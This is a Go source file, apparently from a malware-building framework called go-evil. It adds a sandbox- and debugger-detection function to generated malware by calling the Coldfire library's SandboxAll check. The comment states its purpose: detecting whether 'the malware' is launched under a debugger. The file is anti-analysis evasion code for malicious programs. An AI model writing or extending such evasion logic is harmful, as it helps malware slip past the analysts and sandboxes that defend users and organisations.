package debugger

import (
	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
)

// Adds the responsible code used for detecting if the malware is launched
// under a debugger
func identify(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"return coldfire.SandboxAll()"}

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_function(functions.Go_func_t{Name: "detect_debugger", Func_type: "null", Return_type: "bool", Gut: body})

	return structure.Send(data_object)
}
